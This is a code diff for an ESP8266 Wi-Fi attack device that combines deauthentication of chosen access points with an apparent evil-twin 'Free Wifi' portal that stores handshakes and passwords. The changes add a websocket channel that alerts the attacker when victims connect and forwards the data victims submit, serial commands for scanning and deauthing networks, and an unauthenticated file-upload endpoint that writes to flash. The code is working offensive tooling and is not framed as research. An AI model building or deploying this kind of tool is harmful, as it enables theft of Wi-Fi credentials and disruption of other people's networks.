@@ -17,6 +17,9 @@ ESP8266WebServer server(80);
 WebSocketsServer webSocket = WebSocketsServer(81);
 AccessPoint accessPoints[20];
 AccessPoint selectedAP;
+File fsUploadFile;
+
+int attackersId = -1;
 int AP_COUNT = 0;
 int DEAUTH = 0;
 
@@ -30,26 +33,78 @@ void deauth(AccessPoint ap){
 }
 
 void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
-  if(length == 0) return;
   switch(type) {
-    case WStype_DISCONNECTED:
-      Serial.printf("[%u] Disconnected!\r ", num);
-      break;
-    case WStype_CONNECTED: {
-        IPAddress ip = webSocket.remoteIP(num);
-        Serial.printf("[%u] Connection from ", num);
-        Serial.println(ip.toString());
-        Serial.printf("url: %s\r, ", payload);
-        webSocket.broadcastTXT("New client connected");
+    case WStype_DISCONNECTED:{
+      if(num == attackersId){
+        attackersId = -1;
+      }
+      else{
+        if(attackersId != -1)
+        {
+          webSocket.sendTXT(attackersId, "Victim disconnected");
+        }
       }
       break;
-    case WStype_TEXT:
-      if(strcmp((char*)payload,"ping") == 0){
-        webSocket.sendTXT(num, "pong");
+      }
+    case WStype_CONNECTED:{
+      if(strcmp((char*)payload,"/attack") == 0){
+        attackersId = num;
+      }
+      else{
+        if(attackersId != -1)
+        {
+          webSocket.sendTXT(attackersId, "Victim connected");
+        }
+      }
+      break;
+    }
+    case WStype_TEXT:{
+      DynamicJsonDocument doc(1024);
+      String response;
+      deserializeJson(doc, payload);
+      serializeJsonPretty(doc, response);
+      if(attackersId != -1)
+      {
+        webSocket.sendTXT(attackersId, response);
       }
       break;  
+    }
     default:
       break;  
+  }
+}
+
+void handleFileUpload()
+{
+  HTTPUpload &upload = server.upload();
+
+  if (upload.status == UPLOAD_FILE_START)
+  {
+      String filename = upload.filename;
+      if (filename.startsWith("data"))
+        filename = filename.substring(4);
+      if (!filename.startsWith("/"))
+        filename = "/" + filename;
+      fsUploadFile = LittleFS.open(filename, "w");
+      filename = String();
+  }
+  else if (upload.status == UPLOAD_FILE_WRITE)
+  {
+      if (fsUploadFile)
+      {
+        fsUploadFile.write(upload.buf, upload.currentSize);
+      }
+  }
+  else if (upload.status == UPLOAD_FILE_END)
+  {
+      if (fsUploadFile)
+      {
+        fsUploadFile.close();
+      }
+      else
+      {
+        server.send(500, "text/plain", "500: couldn't create file");
+      }
   }
 }
 
@@ -80,8 +135,13 @@ void setup()
   server.on("/get_networks",[](){AP_COUNT = scan_networks(accessPoints); available_networks(server,accessPoints,AP_COUNT,DEAUTH,selectedAP);});
   server.on("/clear_handshakes",[]() {server.send(200, "application/json", clearHandshakes());});
   server.on("/clear_passwords",[]() {server.send(200, "application/json", clearPasswords());});
+  server.on(
+      "/upload", HTTP_POST, [](){server.send(200, "application/json", "{\"message\":\"File uploaded successfully\"}"); },
+      handleFileUpload);
+  server.on("/reupload", [](){ server.send(200, "text/html", "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='file' directory='' webkitdirectory=''><input type='submit' value='Upload'></form>");});
 
-  server.on("/deauth",[](){
+  server.on("/deauth", []()
+            {
     int n = server.arg("ap").toInt(); 
     if(n > 0 && n <= AP_COUNT){
       if(DEAUTH == 1){
@@ -95,13 +155,12 @@ void setup()
     }
     else{
       server.send(200, "application/json", "{\"message\":\"Invalid Access Point number\",\"status\":\"error\"}");
-    }
-  });
-  server.on("/stop_deauth",[](){
+    } });
+  server.on("/stop_deauth", []()
+            {
     DEAUTH = 0;
     selectedAP.deauthState=0; 
-    server.send(200, "application/json", "{\"message\":\"Stopped Deauthenticating "+selectedAP.ssid+"\"}");
-    });
+    server.send(200, "application/json", "{\"message\":\"Stopped Deauthenticating "+selectedAP.ssid+"\"}"); });
 
   server.onNotFound([](){handleNotFound(server);});
 
@@ -126,6 +185,10 @@ void loop()
       Serial.println("show datas - show datas file");
       Serial.println("reset ssid - reset ssid to default(Free Wifi)");
       Serial.println("storage info - show storage info");
+      Serial.println("scan - scan for networks");
+      Serial.println("list networks - list networks");
+      Serial.println("deauth <ap> - deauth an access point");
+      Serial.println("stop deauth - stop deauthenticating");
     }
 
     else if (strcmp(buffer, "ls") == 0) {
